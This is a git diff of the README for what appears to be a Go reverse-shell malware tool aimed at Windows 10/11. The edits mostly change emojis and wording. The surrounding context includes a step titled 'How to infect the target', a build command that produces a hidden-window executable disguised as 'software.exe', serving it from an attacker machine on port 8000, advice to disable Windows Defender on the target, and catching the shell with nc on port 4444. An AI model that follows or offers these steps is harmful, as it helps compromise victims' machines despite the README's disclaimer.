@@ -25,7 +25,7 @@ can be used to gain access into machines you don't have permissions. Please, all
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## 🪰 How to use it?
+## 👻 How to use it?
 
  Since you've cloned the repo. Just navigate into it and execute the command:
 
@@ -62,7 +62,7 @@ GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.ex
 ``` 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## 👾 How to infect the target ?
+## 😾 How to infect the target ?
 
  Firts, make sure you have installed python3.
  
@@ -100,11 +100,17 @@ http://attacker_machine_ip:8000
 
 ```  
 
- just disable win defender and download the previous compiled *software.exe*
+ You can disable win defender and download the previous compiled *software.exe* - windows allways display an alert when it download any file.
 
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## 😈 Final attack
+## 🚩 Final 
+
+```bash
+
+ Enable windows defender in target machine
+
+```
  
 
  Start to listen with nc in the port 4444
@@ -129,7 +135,7 @@ Listening on 0.0.0.0 4444
 
 ## ✅ Conection stablished
 
-📹 see demo in **demo.mp4** 
+📹 You can watch the demo in **demo.mp4** 
 
 ## ⚠️  Disclaimer
 
@@ -143,13 +149,12 @@ Please do not use this malware to attack systems that you do not have access to.
 Tested on Windows 10 / 11
 
 ```
+## 🛡️⚔️ Sponsor 
 
-## 💞 Sponsor
+![httpx Next Hackers Generation](./httpx_next_hackers_gen.png)
 
-join our cybersecurity discord community : https://discord.gg/PKwfaETBD
+join our cybersecurity discord community:
+[https://discord.gg/PKwfaETBD](https://discord.gg/PKwfaETBD)
 
-```bash
-
+```text
 if the dc link is expired, contact me on Gmail : kaijul3le@gmail.com
-
-```
